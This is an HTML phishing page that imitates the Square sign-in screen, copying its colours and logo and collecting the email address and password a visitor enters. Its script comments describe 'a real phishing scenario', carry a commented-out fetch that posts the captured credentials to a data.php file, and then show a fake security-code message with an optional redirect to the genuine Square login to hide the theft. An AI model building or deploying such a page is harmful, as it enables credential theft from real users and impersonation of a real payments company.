


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in - Square</title>
  <style>
    /* CSS - Styling to match Square's aesthetic */
    body {
      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f6f6f6;
      color: #333;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    .container {
      display: flex;
      flex: 1;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background: white;
      padding: 40px 50px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      margin: 20px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
      font-size: 28px;
      font-weight: 700;
      color: #0066ff; /* Square's signature blue */
      letter-spacing: -1px;
    }

    .logo img {
      max-height: 40px;
    }

    .title {
      text-align: center;
      font-size: 24px;
      margin-bottom: 30px;
      color: #212121;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #555;
      font-weight: 600;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }

    input:focus {
      border-color: #0066ff;
      outline: none;
      box-shadow: 0 0 0 2px rgba(0, 102, 255, 0.2);
    }

    .btn {
      width: 100%;
      padding: 14px;
      background-color: #0066ff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: #0052cc;
    }

    .links {
      text-align: center;
      margin-top: 20px;
    }

    .links a {
      color: #0066ff;
      text-decoration: none;
      font-size: 14px;
    }

    .links a:hover {
      text-decoration: underline;
    }

    #error-message {
      color: #d32f2f;
      background-color: #ffebee;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 20px;
      font-size: 14px;
      text-align: center;
      display: none;
    }

    #loading {
      text-align: center;
      display: none;
      margin-bottom: 20px;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0066ff;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Mobile responsiveness */
    @media (max-width: 600px) {
      .login-box {
        margin: 10px;
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="20" viewBox="0 0 100 20">
          <path d="M10 0C4.477 0 0 4.477 0 10s4.477 10 10 10 10-4.477 10-10S15.523 0 10 0zm0 18C5.582 18 2 14.418 2 10S5.582 2 10 2s8 3.582 8 8-3.582 8-8 8z" fill="#0066ff"/>
          <text x="25" y="15" font-family="Arial, sans-serif" font-size="12" font-weight="bold" fill="#333">Square</text>
        </svg>
      </div>
      <h1 class="title">Sign in</h1>
      
      <div id="error-message"></div>
      
      <div id="loading">
        <div class="spinner"></div>
      </div>

      <form id="login-form">
        <div class="form-group">
          <label for="email">Email or mobile number</label>
          <input type="email" id="email" name="email" placeholder="you@example.com" required>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit" class="btn">Sign in</button>
      </form>

      <div class="links">
        <a href="#">Forgot password?</a><br><br>
        <a href="#">Create a Square account</a>
      </div>
    </div>
  </div>

  <script>
    // JavaScript - Logic to mimic the login process and capture data
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const form = document.getElementById('login-form');
      const btn = document.querySelector('.btn');
      const loading = document.getElementById('loading');
      const errorMessage = document.getElementById('error-message');

      // Hide error and show loading
      errorMessage.style.display = 'none';
      form.style.display = 'none';
      loading.style.display = 'block';
      btn.disabled = true;

      // Simulate network request delay
      setTimeout(() => {
        // In a real phishing scenario, you would send this data to your server
        // For now, we'll simulate a failed login or a successful one
        
        // Example: Send data to a file named 'data.php'
        // fetch('data.php', {
        // method: 'POST',
        // headers: { 'Content-Type': 'application/json' },
        // body: JSON.stringify({ email: email, password: password })
        // });

        // Simulate a successful login after a delay
        setTimeout(() => {
          loading.style.display = 'none';
          form.style.display = 'block';
          btn.disabled = false;
          errorMessage.textContent = "We found your account. Please check your email for a security code.";
          errorMessage.style.display = 'block';
          
          // Optional: Redirect to the real Square login for 2FA
          // window.location.href = 'https://squareup.com/login';
        }, 1500);
      }, 1000);
    });
  </script>
</body>
</html>
 
